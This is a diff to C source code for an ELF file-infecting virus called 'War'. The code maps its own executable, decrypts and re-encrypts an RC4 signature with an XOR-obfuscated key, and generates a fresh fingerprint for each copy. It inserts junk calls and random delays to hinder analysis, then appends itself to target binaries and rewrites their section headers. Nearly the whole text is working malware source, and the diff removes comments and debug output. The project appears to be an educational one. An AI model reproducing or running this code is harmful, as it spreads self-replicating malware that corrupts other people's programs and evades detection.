@@ -1,10 +1,7 @@
 #include "../include/war.h"
 
 static bool find_signature_location(virus_payload *payload) {
-    // Buscar el marcador de la firma encriptada
-    // Usamos los primeros bytes de ENCRYPTED_BASE_SIG como patrón
     
-    // OPCIÓN 1: Buscar patrón específico de bytes encriptados
     unsigned char signature_pattern[] = { 0x99, 0xa4, 0x9c, 0x24, 0xb2 };
     size_t pattern_len = sizeof(signature_pattern);
     
@@ -14,44 +11,42 @@ static bool find_signature_location(virus_payload *payload) {
             return true;
         }
     }
-    
-    // OPCIÓN 2: Buscar después de desencriptar (más robusto)
-    // Desencriptar temporalmente y buscar "War version"
     unsigned char rc4_key[9];
+    unsigned char OBFUSCATED_KEY[] = { 
+        0x76, 0x70, 0x66, 0x66, 0x35, 0x23, 0x30, 0x66, 0x66
+    };
     for (size_t i = 0; i < 9; i++) {
-        // Reconstruir la clave (debe coincidir con signature.c)
-        unsigned char OBFUSCATED_KEY[] = { 
-            0x76, 0x70, 0x66, 0x66, 0x35, 0x23, 0x30, 0x66, 0x66
-        };
         rc4_key[i] = OBFUSCATED_KEY[i] ^ 0x42;
     }
-    
-    // Intentar desencriptar diferentes posiciones
     unsigned char test_buffer[64];
     const char target[] = "War version";
-    
+    size_t search_count = 0;
     for (size_t i = 0; i < payload->size - 64; i++) {
         memcpy(test_buffer, payload->code + i, 64);
-        rc4_crypt(test_buffer, 64, rc4_key, 16);
+        rc4_crypt(test_buffer, 64, rc4_key, 9);
+        
+        if (search_count % 10000 == 0) {
+        }
+        search_count++;
         
         if (memcmp(test_buffer, target, strlen(target)) == 0) {
             payload->sig_offset = i;
+            
+            test_buffer[63] = '\0';
+            
             return true;
         }
     }
-    
     return false;
 }
 
 static uint32_t generate_new_fingerprint(void) {
-    // Mismo método que en signature.c, pero calculando nuevo valor
     uint32_t seed = 0;
     
     seed ^= (uint32_t)time(NULL);
     seed ^= (uint32_t)getpid();
     seed ^= (uint32_t)(uintptr_t)&seed;
     
-    // Añadir más entropía: leer /dev/urandom
     int fd = open("/dev/urandom", O_RDONLY);
     if (fd >= 0) {
         uint32_t random_val;
@@ -60,7 +55,6 @@ static uint32_t generate_new_fingerprint(void) {
         close(fd);
     }
     
-    // Rotar el seed para más variación
     seed = (seed << 13) | (seed >> 19);
     seed ^= 0xDEADBEEF;
     
@@ -69,14 +63,11 @@ static uint32_t generate_new_fingerprint(void) {
 
 static void patch_signature(virus_payload *payload) {
     if (payload->sig_offset == 0) {
-        // No se encontró la firma, no modificar
         return;
     }
     
-    // Generar nuevo fingerprint
     uint32_t new_fingerprint = generate_new_fingerprint();
     
-    // Reconstruir la firma completa
     unsigned char rc4_key[9];
     unsigned char OBFUSCATED_KEY[] = { 
         0x76, 0x70, 0x66, 0x66, 0x35, 0x23, 0x30, 0x66, 0x66
@@ -85,18 +76,16 @@ static void patch_signature(virus_payload *payload) {
         rc4_key[i] = OBFUSCATED_KEY[i] ^ 0x42;
     }
     
-    // Construir nueva firma en texto plano
     char new_signature[64];
     snprintf(new_signature, sizeof(new_signature),
-             "War version 1.0 (c)oded by jainavas - jainavas - [%08X]",
+             "War version 1.0 (c)oded by jainavas - jvidal-t - [%08X]",
              new_fingerprint);
     
-    // Encriptar la nueva firma
     unsigned char encrypted_sig[64];
     memcpy(encrypted_sig, new_signature, strlen(new_signature));
-    rc4_crypt(encrypted_sig, strlen(new_signature), rc4_key, 16);
+    rc4_crypt(encrypted_sig, strlen(new_signature), rc4_key, 9);
     
-    // Reemplazar en el código
+    
     memcpy(payload->code + payload->sig_offset, 
            encrypted_sig, 
            strlen(new_signature));
@@ -106,14 +95,12 @@ static virus_payload* read_self_code(void) {
     virus_payload *payload = malloc(sizeof(virus_payload));
     if (!payload) return NULL;
     
-    // Abrir /proc/self/exe
     int fd = custom_open("/proc/self/exe", O_RDONLY);
     if (fd < 0) {
         free(payload);
         return NULL;
     }
     
-    // Obtener tamaño del archivo
     struct stat st;
     if (fstat(fd, &st) < 0) {
         custom_close(fd);
@@ -121,7 +108,6 @@ static virus_payload* read_self_code(void) {
         return NULL;
     }
     
-    // Mapear el binario completo
     void *self_data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
     custom_close(fd);
     
@@ -130,41 +116,46 @@ static virus_payload* read_self_code(void) {
         return NULL;
     }
     
-    // Parsear como ELF
     Elf64_Ehdr *ehdr = (Elf64_Ehdr *)self_data;
     Elf64_Phdr *phdr = (Elf64_Phdr *)(self_data + ehdr->e_phoff);
     
-    // Encontrar el segmento PT_LOAD ejecutable (el código)
-    void *code_start = NULL;
-    size_t code_size = 0;
+    size_t min_offset = (size_t)-1;
+    size_t max_end = 0;
     
     for (int i = 0; i < ehdr->e_phnum; i++) {
-        if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & PF_X)) {
-            code_start = self_data + phdr[i].p_offset;
-            code_size = phdr[i].p_filesz;
-            break;
+        if (phdr[i].p_type == PT_LOAD) {
+            if (phdr[i].p_offset < min_offset) {
+                min_offset = phdr[i].p_offset;
+            }
+            size_t segment_end = phdr[i].p_offset + phdr[i].p_filesz;
+            if (segment_end > max_end) {
+                max_end = segment_end;
+            }
         }
     }
     
-    if (!code_start) {
+    if (min_offset == (size_t)-1 || max_end == 0) {
         munmap(self_data, st.st_size);
         free(payload);
         return NULL;
     }
     
-    // Copiar el código a memoria writable
-    payload->code = malloc(code_size);
+    size_t total_size = max_end - min_offset;
+    void *code_start = self_data + min_offset;
+    
+    payload->code = malloc(total_size);
     if (!payload->code) {
         munmap(self_data, st.st_size);
         free(payload);
         return NULL;
     }
     
-    memcpy(payload->code, code_start, code_size);
-    payload->size = code_size;
-    payload->sig_offset = 0;  // Se buscará después
+    memcpy(payload->code, code_start, total_size);
+    payload->size = total_size;
+    payload->sig_offset = 0;
     
     munmap(self_data, st.st_size);
+    
     return payload;
 }
 
@@ -188,6 +179,7 @@ static int write_infected_file(const char *filepath, void *data, size_t size)
 		return -1;
 	return 0;
 }
+
 int infect_binary(const char *filepath)
 {
 	t_elf elf = {0};
@@ -209,57 +201,63 @@ int infect_binary(const char *filepath)
 	if (order == 0 || order == 1)
 	{
 		if (parse_elf(filepath, &elf) < 0)
-			return printf("6\n"), -1;
+			return -1;
 		insert_garbage3();
 	}
 	pepino += 23432;
 	if (order == 2 || order == 3)
 	{
-		sig = get_signature();
-		sig_len = strlen(sig) + 1;
-		random_delay();
-	}
-	pepino += 234;
-	if (order == 2 || order == 3)
-	{
 		if (parse_elf(filepath, &elf) < 0)
-			return printf("5\n"), -1;
+			return -1;
 		insert_garbage4();
-	}
-	if (order == 0 || order == 1)
-	{
-		sig = get_signature();
-		sig_len = strlen(sig) + 1;
-		insert_garbage2();
 	}
 	insert_garbage4();
 	if (is_infected(&elf))
 	{
 		cleanup_elf(&elf);
-		return printf("4\n"), 0;
+		return 0;
 	}
 	random_delay();
 	virus = read_self_code();
-    if (!virus) {
-        cleanup_elf(&elf);
-        return printf("3\n"), -1;
-    }
-    if (!find_signature_location(virus)) {
-        free(virus->code);
-        free(virus);
-        cleanup_elf(&elf);
-        return printf("2\n"), -1;
-    }
-    patch_signature(virus);
-    sig = (const char *)virus->code;
-    sig_len = virus->size;
+	if (!virus) {
+		cleanup_elf(&elf);
+		return -1;
+	}
+	if (!find_signature_location(virus)) {
+		free(virus->code);
+		free(virus);
+		cleanup_elf(&elf);
+		return -1;
+	}
+	patch_signature(virus);
+	unsigned char rc4_key[9];
+	unsigned char OBFUSCATED_KEY[] = { 
+		0x76, 0x70, 0x66, 0x66, 0x35, 0x23, 0x30, 0x66, 0x66
+	};
+	for (size_t i = 0; i < 9; i++) {
+		rc4_key[i] = OBFUSCATED_KEY[i] ^ 0x42;
+	}
+	static char final_signature[128];
+	memset(final_signature, 0, sizeof(final_signature));
+	size_t sig_to_copy = 59;
+	if (virus->sig_offset + sig_to_copy > virus->size) {
+		sig_to_copy = virus->size - virus->sig_offset;
+	}
+	memcpy(final_signature, virus->code + virus->sig_offset, sig_to_copy);
+	rc4_crypt((unsigned char *)final_signature, sig_to_copy, rc4_key, 9);
+	final_signature[sig_to_copy] = '\0';
+	sig = final_signature;
+	sig_len = strlen(sig) + 1;
+	free(virus->code);
+	free(virus);
+	virus = NULL;
 	original_size = elf.size;
 	new_size = original_size + sig_len;
 	new_data = malloc(new_size);
 	if (!new_data)
 	{
 		cleanup_elf(&elf);
-		return printf("1\n"), -1;
+		return -1;
 	}
 	insert_garbage5();
 	memcpy(new_data, elf.data, original_size);
@@ -293,12 +291,10 @@ int infect_binary(const char *filepath)
 	}
 	insert_garbage5();
 	if (last_section >= 0)
-	{
 		new_shdr[last_section].sh_size += sig_len;
-	}
 	ret = write_infected_file(filepath, new_data, new_size);
 	free(new_data);
 	pepino = save;
-	pepino *= 1;
-	return (printf("done\n"), ret);
+	pepino *= 1;	
+	return ret;
 }
